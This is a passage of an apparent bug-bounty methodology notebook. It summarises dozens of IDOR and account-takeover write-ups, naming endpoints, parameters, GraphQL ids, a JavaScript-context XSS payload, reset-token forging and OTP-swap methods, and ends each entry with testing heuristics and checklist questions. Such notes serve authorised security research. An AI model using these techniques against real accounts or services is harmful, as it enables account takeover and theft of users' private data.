- Approach/how-found: decoded the token to a PHP-serialized object exposing `profile_id` (the real object ref). Forged tokens differed by 32 chars yet decrypted identically — researched Zlib (asked Reddit), learned everything after the **Adler32 checksum** is ignored by the inflater, explaining the collision. Read JS + brute-forced a directory to find the missing `Transaction_Token`, scripted token generation with the victim's `profile_id`, and reset their password.
- Test: don't treat opaque/"encrypted" tokens as black boxes — base64-decode and check for compression (Zlib/gzip magic) and serialization (PHP `a:2:{...}`, Java, .NET); the user/object id is often inside. Mine JS + brute dirs for any companion token (CSRF/Transaction) the forge needs.
- Q: "Is the opaque token just encoded/compressed/serialized (not truly encrypted), with my `profile_id`/`user_id` inside? Can I swap that id, fix any checksum/companion-token, and reissue it?"

### [247] E-commerce — "set as default address" IDOR returns 200 EMPTY (looks dead), but the swapped address surfaces on the CHECKOUT page → leaks any user's name/address/mobile — Rahul Varale [NEW ★ empty response ≠ no impact; verify the side effect elsewhere]
- Where: address `set-as-default` POST keyed by sequential `address_id`; impact visible on the checkout page.
- Approach/how-found: direct address read validated the session (own address only). But the "set as default" action accepted a sequential `address_id` and returned 200 with an empty body (seemed useless). Going to checkout then rendered ANOTHER user's address (name, full address, mobile) — the action had set the victim's address as the attacker's default.
- Test: when an action returns 200 with an empty body, check its SIDE EFFECT on other pages (checkout/profile/confirmation/summary) — a swapped object id may surface there. set-default/select/apply/pin actions can pull a victim's object into your own view.
- Q: "Does an action with an empty 200 have a side effect (set-default/select) that surfaces the victim's object on another page? Did I verify impact beyond the immediate response?"

### [248] Forgot-password endpoint echoes the recipient email ("Email Sent successfully to x@y") and keys on a sequential numeric `id` → brute 1–50,000 → 50K private emails — savxiety [DUP reinforcement: response-echoed email + sequential id; found via waybackurls + inurl:id dork]
- Where: forgot-password `.aspx` endpoint with an `id` GET param that returns the target's email in the response.
- Approach/how-found: recon (waybackurls) found a forgot-password page; `site:subdomain inurl:id` dork surfaced an endpoint whose response echoed "Email Sent successfully to redacted@gmail.com". Changing `id` 1→2 returned another email; sequential ids → Intruder → 50,000 emails.
- Test: forgot-password / resend / "email me" endpoints often echo the recipient address and key on a sequential user id → enumerate to dump all users' emails. Find them via waybackurls + `inurl:id` dorks.
- Q: "Does a forgot-password/resend endpoint echo the recipient email and key on a sequential id I can brute to dump every user's email?"

### [249] Self-stored-XSS → IDOR → ATO — URL id change was blocked ("not allowed"), but swapping the `Id` in the intercepted edit-address REQUEST overwrote another user's address (carrying the XSS payload); guessable id + no rate limit — Vedant Tekale [NEW ★ URL-id check ≠ request-param-id check]
- Where: edit-address request `Id` param (changing it in the URL was blocked; changing it in the intercepted request body/param worked).
- Approach/how-found: address first/last-name fields held a stored (self) XSS. Editing the address by changing the id in the URL gave "you are not allowed", but intercepting the request and changing the `Id` param said "Address changed successfully" → he overwrote another user's address book (and the XSS rode along). Guessable id + no rate limit → overwrite any user → self-XSS becomes stored-XSS-on-victim → ATO.
- Test: if a URL-level id change is blocked, intercept and change the id in the request PARAMETER/body (often a different, unguarded code path). Writing to a victim's field that stores your XSS = stored XSS on them → ATO.
- Q: "Does the URL id check differ from the request-param id check (swap the param, not the URL)? Can I write my stored-XSS payload into a victim's profile field via an edit IDOR?"

### [250] ATO via hidden `uid` JSON param (Param Miner) + `csrf_token=null` bypass + current-password not required → change ANY user's password — Mohsin khan ($1,000) [NEW ★ Param Miner hidden-param discovery + null-token CSRF bypass]
- Where: change-password endpoint; hidden JSON body param `uid` (found with Param Miner "Guess JSON parameter"); `csrf_token=null`.
- Approach/how-found: chained insights — current-password wasn't actually required; the CSRF token couldn't be removed but setting `csrf_token=null` bypassed validation; no `userID` appeared in the request, so Param Miner's JSON-param guesser revealed a hidden `uid` → set the victim's uid in the change-password body → change anyone's password without interaction (demoed on admin@).
- Test: run Param Miner (Guess JSON / headers / query) to find HIDDEN params like `uid`/`user_id` absent from the normal request, then inject them into write/reset endpoints. Try `csrf_token=null` (not just removal). "Current password not required" is itself a reset bypass.
- Q: "Can Param Miner find a hidden body param (uid/user_id) that lets me target another user on a write/reset endpoint? Does `csrf_token=null` bypass CSRF? Is current-password truly required?"

### [251] Online-meeting platform — signup identity travels over a WebSocket frame (UUID+email); set UUID to the victim's + a new email → victim's email changed → reset password → ATO; UUID harvested via follow-user — Mohsin khan [NEW ★ inspect WebSocket frames for swappable identity]
- Where: signup/update WebSocket message carrying `UUID`+email+username; victim UUID exposed via the follow-user button.
- Approach/how-found: HTTP change-info was JWT-protected (401 without token). But after signup a WebSocket frame carried the UUID; setting it to the victim's UUID with a new email changed the victim's email (the victim got logged out), then password reset → ATO. 40+ hunters missed it because they ignored WebSockets; the UUID was grabbed from the profile/follow feature.
- Test: inspect WEBSOCKET frames (not just HTTP) for identity fields (UUID/user_id) you can swap to act on a victim → email change → ATO. Harvest the UUID from social features (follow/profile/search).
- Q: "Does any WebSocket frame carry a UUID/identity I can swap to change a victim's email → ATO? Where do user UUIDs leak (follow/profile/search)? Did I test WS, not just HTTP?"

### [252] Job portal — uploaded CV/resume served from a public/guessable endpoint; a login-failure email leaked that endpoint → all resumes exposed — Vishal Bharad (Critical) [DUP reinforcement: uploaded files at public URLs + transactional-email leak] (tail member-locked; technique captured from intro)
- Where: CV/resume file endpoint (publicly accessible), leaked via a login-failure email.
- Approach/how-found: entering a wrong password triggered an email containing profile info including the CV/resume endpoint URL, which was publicly available with no auth → everyone's resumes exposed.
- Test: uploaded files (CV/resume/docs/IDs) often live at public/guessable URLs with no auth; transactional emails (login-failure, profile, confirmation) leak those URLs. Check whether the file URL requires authorization.
- Q: "Are uploaded files (CV/resume/docs) served from a public/guessable URL without auth? Do transactional emails leak the file URL? Is the file id sequential/enumerable?"

### [253] Podcast episode metadata IDOR (publicly visible 'random' id) $250 — evanricafort [DUP reinforcement]
- `PUT /api/podcastepisode/<episodeId>/metadata` — swap episodeId → edit anyone's episode title/description. The id is alphanumeric "random" but is shown publicly to everyone, so it's trivially sourced. Reinforces: "random ≠ unguessable if it's displayed publicly."

### [254] Facebook Messenger Rooms — `sendMessage` (doc_id=3350161661730468) takes a recipient `id`; swap it + set `message` + random `offline_threading_id` → deliver an (ephemeral) message/notification to ANY FB user — servicenger [NEW: share/send action keyed by a recipient id → message-spoof any user]
- Where: FB `sendMessage` API (doc_id=3350161661730468); params `id` (recipient), `message`, `offline_threading_id`.
- Approach/how-found: sharing a room link via Messenger fires `sendMessage` creating an offline thread; changing `id` to the victim's user id, `message` to arbitrary text, and `offline_threading_id` to a random number delivered a message notification + thread popup to any user (ephemeral — vanishes on refresh).
- Test: share/invite/send/notify actions that build a message take a recipient `id` + content → swap the recipient to message arbitrary users (notification spoofing). Offline/ephemeral threading ids are often just random numbers.
- Q: "Does a share/send/invite action take a recipient id + message I can set to deliver a (spoofed/ephemeral) message or notification to any user?"

### [255] Facebook — developer task list of ANY app: GraphQL `app_tasks` keyed on `appId`; swap to a third-party app's id → its private dev tasks — Amine Aboud [DUP-reinforce: swap resource owner id in GraphQL]
- Where: `POST /graphql` `variables={"appId":X}&doc_id=265437575802287` → `data.app_tasks[]`.
- Approach/how-found: noticed a GraphQL request returning his own app's task list; changed `appId` to another app's id → returned that app's private developer tasks (objective, deadline, completion_time).
- Test: developer/console GraphQL queries (apps, projects, integrations) key on an owner/app id — swap it for an id you don't own; harvest app ids from public app pages.
- Q: "Do developer-console queries (`appId`/`projectId`) enforce ownership, or return any id's private config/tasks?"

### [256] OTP login ATO — `/login/signin {email, code}`: OTP not bound to the email; request a code for YOUR email, then swap the email param to the victim while keeping your valid OTP → logged in as anyone — Avanish Pathak [NEW ★ OTP not coupled to email (defeats rate-limit)]
- Where: `POST /login/signin {email, code}` (4-digit OTP; 429 after 10 tries; not leaked in response).
- Approach/how-found: brute was rate-limited and the OTP wasn't in the response, so neither worked. But the server validated only that the OTP was valid, not that it was issued for that email → enter your own email, receive your OTP, then change `email` to `admin@example.com` with your correct OTP → logged into the victim ("loose coupling of email with OTP").
- Test: on OTP/magic-link login, check that the code is bound to the email/account — request a code for your account, then swap the email param to the victim while keeping YOUR code. This bypasses rate-limiting entirely (you use a valid code).
- Q: "Is the OTP/code cryptographically bound to the email it was sent to? Can I get a code for my account and swap the email param to a victim's while keeping my valid code?"

### [257] Stolen-device portal — Privilege-Management request takes `modifyUserId`; a low-priv admin swaps it to a high-priv account → set its privileges (vertical BAC via IDOR); plus stored XSS by escaping a JS-reflected `name` field (`'));`) — cysek [NEW: privilege-mgmt target-id swap + escape-the-JS-context XSS]
- Where: Privilege-Management page request with `modifyUserId`; user-details `name` reflected unencoded into a JS function (`setProfValues`).
- Approach/how-found: with two admin roles, he captured the privilege-set request (keyed by `modifyUserId`) from the low-priv admin and swapped in a high-priv account's UserId → set privileges he shouldn't control (vertical BAC). Separately, profile fields were reflected unsanitized into a JS string; escaping the string (`test'));`) then `</script><script>alert(1)</script>}'));` → stored XSS.
- Test: in role/privilege-management features, swap the target user id (`modifyUserId`) so a low-priv role modifies a high-priv account. For fields reflected into JS, escape the JS string context (`'));`) instead of brute-forcing XSS payloads.
- Q: "Can a low-priv admin swap the target id in privilege management to modify a higher-priv account? Are profile fields reflected into a JS context I can escape with `'));`?"

### [258] "Bragging Rights" — base64-username report-card IDOR (seed usernames via `wp-json/wp/v2/users`) + serialized-id password-change IDOR, in a 6-bug single-target wave — Manash ($600 of $1,550) [DUP-reinforce: base64/serialized object refs + WordPress user-enum to supply ids]
- Where: report-card generator `POST {requestID: "<base64(username)>"}`; password-change keyed on a serialized user id; WordPress `GET /wp-json/wp/v2/users`.
- Approach/how-found: first enumerated valid usernames via the WordPress REST users endpoint. The "generate/download report card" POST carried `base64(username)` — decode, substitute another username, re-encode → download anyone's PII report card. The password-change accepted a (serialized) user id swap too. He stresses write-ups teach *where to look*, not what an IDOR is.
- Test: always decode base64/hex/serialized request bodies to reveal the real ref (username/id); seed valid ids cheaply via `wp-json/wp/v2/users`, sitemaps, or profile enumeration. Treat report/export/"download my data" endpoints as PII IDOR magnets.
- Q: "Is the object ref hidden inside a base64/serialized field I can decode-edit-re-encode? Can I cheaply enumerate valid usernames/ids (wp-json, sitemap) to feed it?"

### [259] Markdown editor — IDOR to CDN image links incl. DELETED/private images: comment markdown stores `[IMAGE]ID[IMAGE]`; swap the image ID → CDN URL of others' images — Susan Wagle [NEW: "deleted" images still live on CDN; reference by id]
- Where: comment/markdown body containing an image reference `...ID...`; rendering returns the CDN link by id.
- Approach/how-found: uploading an image into a comment produced a markdown token wrapping an image ID. Swapping that ID to other values returned other users' private images — and images users had "deleted" (still on the CDN, just dereferenced).
- Test: when an attachment is referenced by a guessable/sequential id in body content, swap the id to pull others' files; "deleted" objects often remain on the CDN and are reachable by id.
- Q: "Is the uploaded file referenced by a swappable id in the saved content? Are deleted files actually purged from the CDN, or just unlinked?"

### [260] "A token is not the same on all endpoints" — a backup/export endpoint authed by a POST token (no cookies) validates it loosely → obtain any user's backup data — Tommaso De Ponti ($600) [NEW: replay the same token across ALL endpoints; secondary endpoints enforce it weakly] (tail member-locked; technique captured from intro+title)
- Where: a backup endpoint returning user backup data, authorized only by a token in POST data (no cookies), formatted `1234-randomletters`.
- Approach/how-found: every login fired a backup-data call authed by a token (not cookies). The core takeaway (title): the token is NOT validated the same way on every endpoint → a backup/secondary endpoint accepts it without the per-user binding the main flow enforces → read any user's backup.
- Test: replay one token/session across ALL endpoints — auth is often enforced strictly on primary endpoints but loosely (or differently) on backup/export/secondary/legacy ones. Don't assume consistent validation.
- Q: "Is the token validated identically on every endpoint, or does a backup/export/secondary endpoint accept it without the per-user check the main endpoints enforce?"

### [261] Reset PIN == user id (predictable OTP) + IDOR leaks uid/email → ATO everyone; no rate limit — Takester (Critical) [NEW ★ the OTP is a known value; chain with an id-leaking IDOR]
- Where: password reset (4-digit pin sent on mail that equals the user's assigned id); a `.../{uid}` endpoint that echoes the user's submitted admin-request form (name, email, mobile).
- Approach/how-found: reset had no rate limit (already High). Then a `.../{uid}` endpoint opened in incognito showed any user's name/email/mobile by swapping `uid` (IDOR). Critically, the reset PIN was the user's id — so the IDOR leaked exactly the uid+email needed → reset → ATO of every user in seconds.
- Test: check whether the reset OTP/pin is derived from a known/sequential value (user id). IDOR endpoints that echo a submitted form (admin request, application) by id leak the uid+email needed for reset. No rate limit compounds it.
- Q: "Is the reset PIN/OTP actually a known value (user id/sequential)? Does an IDOR leak the uid+email so I can derive the pin and take over?"

### [262] CSRF + IDOR account deletion — `GET /{userName}/account/cancelTrial/` keys on the username in the path with only a Referer check → CSRF PoC with the victim's username + forged Referer deletes any account — Jerry Shah [NEW ★ destructive GET with id-in-path + Referer-only guard]
- Where: `GET /{userName}/account/cancelTrial/?googleAnalyticsId=&mktToken=` (username in path; no CSRF token; Referer-checked).
- Approach/how-found: IDOR alone (swap username) didn't delete; the action was a GET with no CSRF token, only a Referer guard. Crafting a CSRF PoC with the victim's username in the URL and a forged Referer header → account deleted. Burp Comparer between two accounts isolated the username and which params mattered.
- Test: destructive actions that are GETs with the target id/username in the path and only a Referer/Origin guard = CSRF+IDOR. Forge the Referer; swap the id. Diff two accounts' requests (Comparer) to find the target field.
- Q: "Is a destructive action a GET with the target username/id in the path and only a Referer check? Can I combine IDOR (swap id) + CSRF (no token, forged Referer) to delete/modify any account?"

### [263] $5,000 steal private YouTube video frames via Google Ads "Moments" (cross-product pivot) — xdavidhu [NEW ★ cross-product pivot]
- Where: main YouTube blocked private-video access everywhere; pivoted to **Google Ads** (a different product that touches YouTube internally).
- Approach/how-found: in Ads, the video "Moments" feature `POST /aw_video/_/rpc/VideoMomentService/GetThumbnails` with `__ar={"1":videoId,"2":timeMs}` returns a base64 thumbnail. Swapping in a victim's PRIVATE video id returned a frame → loop `timeMs` by 33 (24fps) → reconstruct the private video as a GIF.
- Test: when the main product enforces per-object privacy, pivot to a SIBLING product (Ads/Studio/Cloud/partner/admin tool) that interacts with the same resource — it often lacks the main product's checks; thumbnail/preview/frame endpoints leak the object piecemeal.
- Q: "Which OTHER product or internal service touches this resource and might skip the main product's privacy check? Can a thumbnail/preview/frame/transcode endpoint there leak the private object frame-by-frame?"

### [264] $30,000 create post on ANY Facebook page via Creative Hub share/notify (newer sub-feature skips the check) — darabi [NEW: secondary action skips the check]
- Where: Creative Hub preview creates an "invisible" (unlisted) post on a selected page; invisible posts have a link+id but admins can't see/delete them.
- Approach/how-found: the main preview checked the advertiser role before generating, but the **newer Share feature** skipped the permission check — change `page_id` in the GraphQL mockup, then request the shareable link → post created on any page. After Facebook fixed it, the **`notify_mobile/<PREVIEW_KEY>` ("send to mobile")** action regenerated the preview without the check = fix bypass.
- Test: enumerate every action that triggers the same side effect (preview/share/notify/duplicate); newer/secondary ones often skip the permission check the primary one enforces — and survive the first fix.
- Q: "Does a secondary action (share/notify/duplicate/preview) trigger the same side effect WITHOUT the permission check the primary action enforces? After a fix, does another such action still skip it?"

### [265] ysamm.com post — RECOVER NEEDED (got the blog post-listing index, not the article).

### [266] Async access-logs API keyed by `UserID` → brute → access-logs (incl. private IPs) of 6,000 businesses — Rafi Ahamed ($4-digit) [DUP reinforcement: always-on interception catches the async API; logs leak infra]
- Where: access-logs API POST with `UserID` (loads asynchronously after the page).
- Approach/how-found: always-on interception caught that the access-logs loaded via a separate API carrying `UserID`; Intruder brute over UserID → 6,000 businesses' access logs, leaking private IP addresses.
- Test: data that loads asynchronously (logs, widgets, panels, charts) fires its own API with an id in the body → brute it. Access/activity logs frequently leak private IPs and infrastructure details.
- Q: "Does an async-loaded panel (access logs, analytics, activity) fire an API with a UserID I can brute? Do those logs leak private IPs/infra?"

### [267] Integration-hijack IDOR — connect a VICTIM's form to the ATTACKER's Zendesk by swapping `form_id` in both the initiate (GET) and enable (PATCH) steps → all the victim's future form responses flow to the attacker; form_id leaked via share link/dork — Ronak [NEW ★ route a victim's data stream to your own external sink]
- Where: integration flow — GET (initiate, `form_id`) → 3rd-party auth/mapping → PATCH (enable, `form_id`); both IDOR-vulnerable.
- Approach/how-found: started integrating his own form, swapped `form_id` to the victim's in the GET → landed on auth/mapping which fetched the VICTIM's form questions → configured the ATTACKER's Zendesk Sell → PATCH (enable) with the victim's form_id → integration enabled on the victim's account → every future form response delivered to the attacker's Zendesk. form_id enumerable via the form's share link / Google dork.
- Test: integration/connect/webhook/export flows keyed by an object id → swap to attach a VICTIM's object to YOUR external sink (Zendesk/Sheets/Slack/webhook) → continuous exfiltration of their incoming data. Test every step (initiate + enable). The object id often leaks in share links.
- Q: "Can I attach a victim's resource (form/store/repo) to MY integration/webhook by swapping its id → ongoing data exfiltration? Is the id leaked in share links/dorks? Did I test both the initiate and enable steps?"

### [268] "Secure" app cracked by hidden-param brute — Arjun/Parameth found an undocumented `?id=`; 6781→6780 → other users' data — protector47 ($1,500) [NEW: brute HIDDEN params when nothing obvious is IDOR-able]
- Where: an endpoint with no visible params; a hidden `?id=` discovered via Arjun/Parameth.
- Approach/how-found: XSS/SQLi/etc. all failed on a hardened, old program. He brute-forced HIDDEN parameters (Arjun, Parameth) → found `?id=` → sequential → decrement → other users' data.
- Test: when an app looks secure and exposes no obvious id, brute hidden parameters (Arjun/Parameth/Param Miner) on each endpoint — an undocumented `id`/`user_id`/`uid` is often IDOR-able.
- Q: "Have I brute-forced hidden parameters (Arjun/Parameth) on each endpoint to surface an undocumented id that's IDOR-able? Did I stop too early because nothing visible looked vulnerable?"

### [269] Facebook creator studio — `GamesVideoStreamerDashboardProfileQuery` keys on `profileID`; swap to any game-streaming pageID → private metrics incl. `l30_live_earnings` + `supporter_count` — Kailash ($2,000) [DUP reinforcement: dashboard/analytics query keyed by swappable profile id]
- Where: FB creator-studio GraphQL `GamesVideoStreamerDashboardProfileQuery`; `profileID`.
- Approach/how-found: forwarded all requests, searched Burp for the named query, sent it to Repeater, and replaced `profileID` with a target pageID → returned that page's dashboard stats including 30-day live earnings and supporter count (data only page-role holders should see).
- Test: dashboard/analytics/insights GraphQL queries keyed by a profile/page/account id → swap to read another's private metrics (earnings, supporters, conversions). Search Burp by the GraphQL operation name to locate the exact request.
- Q: "Does a dashboard/analytics query key on a profile/page id I can swap to read another entity's private metrics (earnings/supporters)?"

### [270] Optimizing VDP→bounty: hoard ids/creds, reuse non-login CSRF token, old/dev API as fix-bypass — firstsight [NEW: several methodology gold]
- Long methodology over 2 years on one target's SSO-linked assets.
- Key reusable techniques: (1) **Hoard everything** from points-only/VDP scopes (emails via IDOR/SQLi, credentials, endpoints, Jira screenshots) — later feed those emails/creds into the in-scope bounty asset's customer-data API + brute force. (2) **Access an internal-only API unauthenticated** by reusing the app's *non-login-state* `X-CSRF-Token` + cookie (the app issues a token even when logged out — grab it and replay on the protected endpoint). (3) **Old/hidden API endpoint as a fix-bypass**: after devs moved the customer-data feature to `/api/vx/.../2ndEndpoint`, the OLD `/api/.../1stendpoint` (seen in a dev-area screenshot) still worked in production → re-extract data. (4) **Prod-deactivated accounts still work in dev/stg/uat**. (5) unauthenticated Jira/issue trackers leak creds+endpoints.
- Q: "Did I save every id/email/cred from out-of-scope/points scopes to use on the in-scope asset? Does the app send a CSRF token in the logged-out state I can replay on a protected API? After a fix, does the OLD/dev endpoint still serve the data? Do deactivated prod accounts work in staging?"

### [271] Weak-crypto ATO ×2 — reset token is base64 of `senttime/<ts>/token/<email>` → swap email, re-encode, sync `senttime` (±1) → forge any reset link; OAuth `Authorization` header is base64 of the email → swap → login — Vasuyadav [NEW ★ forge base64 reset/auth tokens]
- Where: password-reset token (base64 `senttime/ts/token/email`); OAuth `Authorization` header (base64 email).
- Approach/how-found: the `==` tail revealed base64. Decoded reset token = `senttime/<timestamp>/token/<email>`. He requested a reset for his account, swapped the email to the victim's, re-encoded, and synced `senttime` (Intruder for near-identical times; ±1 if needed) → a valid reset link for any email → ATO. The OAuth auth header was base64 of the email → swap → logged into the victim.
- Test: decode base64/`==` tokens in reset links and auth headers; if they hold email/id + timestamp, forge them for a victim (match/adjust the timestamp ±1–2). Predictable token structure = ATO.
- Q: "Is the reset/auth token just base64 of email+timestamp I can re-encode for a victim? Can I sync the timestamp (Intruder, ±1) to forge a valid link/header?"

### [272] Crypto-mining app — reset link `/changePassword/{UUID}/{token}` token not bound to the UUID (swap UUID, keep your token); UUID obtained via a referral endpoint that converts a public referral param → UUID (dork the referral links) → ATO any user — Mukul Lohar [NEW ★ token-not-bound + referral-param→UUID converter]
- Where: `POST /changePassword/{UUID}/{token}`; a referral endpoint mapping a public `source` referral param → internal UUID.
- Approach/how-found: the reset link held UUID+token, but the token wasn't bound to the UUID → swap UUID to the victim's (with his own token) → change the victim's password (200). To get the "unguessable" UUID, a referral endpoint converted a public referral `source` param into the UUID; Google-dorking referral links yielded many users' source params → UUIDs → mass ATO.
- Test: when a reset link is id+token, test whether the token is bound to that id (swap id, keep token). For an unguessable UUID, find a converter endpoint (referral/share/invite/profile) that maps a public param → internal UUID; dork for the public params.
- Q: "Is the reset token bound to the UUID, or does my token work with a swapped UUID? Is there a referral/share endpoint that converts a public param into the internal UUID I need?"

### [273] US DoD — account-settings update POST carries `id` in the body (sequential, 623/624); swap to victim + change email → reset → ATO; non-standard signup page found via dorking bypassed the CaC requirement — Gal Nagli [DUP reinforcement: self-id-in-body update → ATO + dork for non-standard auth pages]
- Where: account-settings update POST with `id=<sequential>` in the body (e.g. `id=624&...&email=hacker@...`).
- Approach/how-found: Google-dorked DoD signup/login pages and found a non-standard signup (no CaC card). The settings-update POST sent the user id in the body (instead of deriving it from the session); a 2nd account got the next sequential id → logout, replay the update with the victim's id and an attacker email → victim's email changed → password reset → ATO, no interaction.
- Test: profile-update POSTs that include your own id in the body (rather than from session) → swap to a victim + change their email → reset → ATO. Dork for non-standard signup/login pages that bypass the main auth (CaC/SSO).
- Q: "Does the profile-update POST carry my user id in the body (sequential)? Swap to victim + change email → reset → ATO? Are there non-standard signup pages bypassing the primary auth?"

### [274] YouTube Video Builder (beta) — `UploadToYouTube` `__ar` takes a target channel ID (public) with no ownership check → upload Unlisted videos to ANY channel; a cross-service `scottyResourceId` mismatch leaked all decryption key hashes — Ryan Kovatch ($6,337) [NEW ★ public-id publish-to-any-asset + error leaks key hashes]
- Where: `POST /u/0/videobuilder/_/rpc/Image2VideoUiService/UploadToYouTube` `__ar` with the channel ID (`UCBCW…`, public); `scottyResourceId`.
- Approach/how-found: a beta tool rendered AND uploaded videos, letting you pick a channel. The upload request embedded the channel ID (public, from URL/source) with no ownership check → swap it → Unlisted video uploaded to a channel he didn't own (misinformation vector). Trying to point it at a custom file via a `scottyResourceId` from another YouTube service triggered a `KeyUnavailableException` that listed all stored decryption key hashes — a critical secondary leak.
- Test: upload/publish/post actions that take a target channel/page/account id (publicly known) with no ownership check → post content to others' assets. When cross-service object ids mismatch, the error may leak crypto key hashes/secrets — exceptions can be worse than the blocked feature.
- Q: "Does an upload/publish action take a target channel/account id (public) with no ownership check? Do cross-service resource-id mismatches leak key hashes/secrets in error messages?"

### [275] Google acquisition (Discourse-style) — `/u/{username}.json` returns PII; `/c/.../l/latest.json` leaks usernames → harvest usernames from one endpoint, read PII from the other — Manas Harsh [NEW: `.json` variants of profile/list pages leak PII]
- Where: `/u/{username}.json` (PII); `/c/ask/20/l/latest.json` (leaks user ids/usernames).
- Approach/how-found: spotted a URI leaking usernames/ids; found `/u/{yourusername}.json` returning his own data; swapped the username (harvested from the list endpoint) → other users' PII.
- Test: Discourse/forum-style apps expose `.json` variants (`/u/{username}.json`, `latest.json`, `/c/.../l/latest.json`) that leak usernames + PII — harvest usernames from a list endpoint, read PII from the profile `.json`.
- Q: "Are there `.json` variants of profile/list pages (`/u/{username}.json`) returning PII by a username I can harvest from a list/latest endpoint?"

### [276] Same endpoint, two flows — `?id=` appears in the forced-password-rotation flow but not the normal one; add `?id=88` to `/myaccount` → access/edit any user → change email → reset → ATO — Harsh Bothra (P1) [NEW ★ compare flows; inject the id a sibling flow exposes]
- Where: change-password / `/myaccount` endpoints; `?id=` present in the rotation flow, absent in the normal flow.
- Approach/how-found: a forced password-rotation page exposed `?id=`; after the normal flow that param vanished. He took the `/myaccount` URL (no id) and appended `?id=88` → accessed/edited user 88 → changed email → created a controlled account → reset → full ATO.
- Test: compare ALL flows of the same endpoint (forced rotation vs normal vs mobile) — a param exposed in one flow is often injectable in another. On `/myaccount`-style endpoints with no visible id, fuzz `id/uid/user_id/oid`.
- Q: "Does the same endpoint expose an id param in one flow but not another? Can I append `?id=`/`uid=` to a `/myaccount` endpoint that normally omits it to reach other users?"

### [277] Hacking Apple (sample IDORs): array-of-ids enumeration, mfi `.action` id--, Find-My-Friends share, mobile-proxy trick — Sam Curry et al. [NEW: array-id batch enum + mobile interception]
- Find My Friends "Share My Location": request body `dsIds` = JSON **array of user IDs**; the response returned each member's email → swap/append other user IDs → enumerate Apple customers' emails by incremental numeric id **hundreds at a time** (array param), and irrevocably attach yourself to victims (trusted family relationship = no accept needed).
- `mfi.apple.com` `getReview.action?id=<n>` → `id-1` returned another company's full application (names, emails, addresses, **invitation keys**); ~50k enumerable.
- Support-case IDOR via the iOS app: leaked victim serial number, userID, support details, live-chat token.
- Mobile interception trick: many Apple domains were SSL-pinned, but you could intercept by loading the app WITHOUT the proxy, navigating to the target sub-page, THEN enabling the proxy.
- Test: when an id param is an array, batch-enumerate; abuse trusted-relationship actions that skip acceptance; for SSL-pinned mobile apps, toggle the proxy mid-flow to capture specific calls; decrement `.action`/Struts numeric ids.
- Q: "Is the id sent as an array I can fill with many victim ids in one request? Does a 'trusted relationship' action skip the victim's consent? Can I toggle the proxy mid-flow to capture a pinned mobile call's IDOR?"

### [278] Starbucks SG ATO: test env shares prod auth DB → copy PHPSESSID to production — kamilonurozkaleli ($6,000) [NEW ★ cross-env session copy]
- Where: prod `card.starbucks.com.sg` and a 3rd-party test env `example.com/starbucks`.
- Approach/how-found: an account created on prod could log into the test env → they share the same auth DB. The test env exposed an extra endpoint taking `email=<victim>` that surfaced the victim's partial account info on your profile. Password change failed in the test env (invalid CSRF), so he **copied the `PHPSESSID` cookie from the test env to production** — where the CSRF tokens are valid — and completed full ATO (spend stored credit). Deeper chain via starbucks2/3 test tables: register the victim email in one test env, associate it to your session in another, copy the session to prod.
- Test: find test/staging/3rd-party envs sharing the prod auth DB/session store; perform the privileged step in the weaker env, then carry the session cookie to prod to inherit the account.
- Q: "Does a test/staging/3rd-party app share the production auth DB or session store? Can I associate/authenticate in the weak env then copy the session cookie to prod for ATO?"

### [279] Edmodo (LMS) — 7 IDORs across every feature: quiz files, `badge_id`, schedule `user_id`, invite-by-email (add+reset student=ATO), library `file_id`+`library_id`, grade `submitter_id`, planner `group_id`; always read the RAW response — Pratyush Sarangi [NEW ★ systematically swap the object id in EVERY feature]
- Where: Edmodo endpoints — quiz files, badges (`badge_id`), schedules (`user_id`), email-invite, library (`file_id`+`library_id`), grades (`submitter_id`), planner (`group_id`).
- Approach/how-found: with teacher/student test accounts he swapped the object id in each feature → cross-account read/write (assign others' badges, create schedules for anyone, grade any student, read others' library/quiz files); invite-by-email let him add a student and reset their password (student ATO). He always checked the RAW Burp response (the API returned data the UI filtered).
- Test: in role-based apps (LMS/edtech/SaaS), every feature with an object id is a candidate — swap `submitter_id/user_id/group_id/file_id/badge_id`. Invite-by-email flows can add+control arbitrary users. Read raw API responses — clients filter sensitive fields the server still sends.
- Q: "For each feature, is there an object id (submitter_id/user_id/group_id/file_id) I can swap cross-account? Does invite-by-email let me add+reset a victim? Does the raw response carry fields the UI hides?"

### [280] Five ATOs in one site — login-failure leaks userid → JWT identity swap; Google-OAuth email swap; 4-digit OTP no-rate-limit brute; OTP response-manipulation; reset keyed by a userid (not OTP) — Vasuyadav [NEW ★ enumerate EVERY auth path on one target]
- Where: JWT (userid), Google OAuth (email param), OTP verify (no rate limit + response manip), reset set-password (userid in body, no OTP field).
- Approach/how-found: (1) login-with-wrong-password response leaked the userid → swap it in the JWT → log into account 2. (2) intercept Google sign-in, change the email → into a different account. (3) 4-digit OTP had no rate limit → brute. (4) OTP response-manipulation (wrong code, rewrite response to the success shape). (5) the set-new-password request carried an (encrypted but response-leaked) userid and no OTP field → swap userid → change anyone's password.
- Test: enumerate ALL auth paths on one target — JWT identity swap, OAuth email swap, OTP brute (no rate limit), OTP response-manip, and reset-keyed-by-userid-not-OTP. Login-failure responses frequently leak the userid.
- Q: "Across login/OAuth/OTP/reset, which trusts a client value (JWT userid, OAuth email, userid in reset) or lacks rate-limit/response binding? Does a login-failure response leak the userid?"

### [281] Reset token validates ONLY the userid (base64 `userid+email+…`), never expires; a JS-found endpoint leaks PII+email by userid → brute (id 1 = admin) → reset → ATO — Pradeep Kumar [DUP reinforcement: partial-token validation + JS-found id-leak → ATO]
- Where: reset link (base64 `588588killer@gmail.com…+++588588`; only the userid validated; non-expiring); a JS-referenced endpoint leaking PII by `userID`.
- Approach/how-found: decoded the reset token — only the userid portion was validated (email/gibberish ignored) and the link didn't expire → reset anyone by userid. A JS-referenced IDOR endpoint returned username/email/residence address by userid → brute (userID 1 = admin) → harvest email → reset → ATO.
- Test: decode reset tokens; if only the userid is validated (and links don't expire), reset by userid. Mine JS for an endpoint that leaks PII+email by userid to enumerate targets (and find admin at id 1).
- Q: "Does the reset token validate only the userid (ignoring email/signature) and never expire? Is there a JS-referenced endpoint leaking PII/email by userid to enumerate (admin = id 1)?"

### [282] Travel app — payment IDOR by brute-forcing `req_reference_number` at the payment-gateway redirect → other users' SSN/passport/ticket — Ganesh (haxor8595) ($800) [DUP-reinforce: brute a reference number in a payment redirect]
- Where: payment-gateway redirect request body, `req_reference_number` parameter.
- Approach/how-found: at checkout the app redirected to a payment processor; out of curiosity he brute-forced `req_reference_number` in the request body → listed other users' payments incl. SSN, passport number, name, ticket IDs.
